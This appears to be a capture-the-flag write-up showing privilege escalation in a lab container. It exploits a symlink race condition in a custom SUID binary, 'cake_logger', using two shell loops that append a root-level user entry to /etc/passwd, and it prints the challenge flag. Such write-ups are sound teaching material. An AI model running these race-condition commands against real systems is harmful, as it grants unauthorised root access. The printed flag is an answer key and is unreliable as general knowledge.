After initial enumeration, you will find a custom SUID binary.
```
postgres@ctf-cake-architect-user-26ba6272aefcb0d9-67566865dd-64pv5:~$ find / -perm -4000 2>/dev/null
...[SNIP]...
/usr/local/bin/cake_logger
```

`cake_logger` can add text to existing recipe, and create symlinks as root. You can copy the file to your host to reverse, but not necessary.

![alt text](/CTF-writeups/2025/brunnerctf-2025/images/cakearchitect-cakelogger.png)

If you try to write to a root protected file with `cake_logger` it fails because we don't have ownership.

Basically, we have a write primitive via symlink race condition here, because there is a gap when it does the `access()`  check.

You need to open 2 sessions to exploit this.

Session 1: Keep making a symlink to `/etc/passwd`
```bash
while true; do rm race1; echo "" >> race1; ln -s /etc/passwd race1 -f; done
```

Session 2: Use `cake_logger` to write to the symlinked `/etc/passwd` when the race condition hits.
```bash
while true; do /usr/local/bin/cake_logger race1 'benkyou:$6$GBj/Ef3A7SyWHkhB$3eZ7tsbmnbaQJh69UrmR0uO7LBdXspfDBVbg4xjuUWeeJIOg2GU9Ue2kRSJTvXIAtmBwPbMZK4vLAO.WtNpQA1:0:0:/root:/bin/bash'; done
```

Login with `benkyou:benkyou` to get root.

Flag: `brunner{Wh4T_t1M3_15_1T?_FL4G_0_CL0CK!!}`

Solved by: benkyou